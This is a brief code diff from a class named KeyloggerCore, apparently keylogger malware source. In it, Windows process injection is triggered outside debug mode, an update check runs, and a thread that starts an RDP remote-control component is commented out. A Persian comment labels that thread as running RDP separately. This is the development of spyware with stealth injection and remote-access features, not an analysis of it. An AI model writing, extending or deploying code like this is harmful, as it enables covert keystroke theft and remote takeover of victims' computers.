@@ -62,8 +62,8 @@ class KeyloggerCore:
             if platform.system().lower() == "windows" and not Config.DEBUG_MODE:
                 self.attempt_process_injection()
 
-            if platform.system().lower() == "windows":
-                threading.Thread(target=self.rdp_controller.start, daemon=True).start()  # اجرای RDP در ترد جدا
+            # if platform.system().lower() == "windows":
+            #     threading.Thread(target=self.rdp_controller.start, daemon=True).start()  # اجرای RDP در ترد جدا
             # بررسی نسخه
             self.check_for_updates()
 
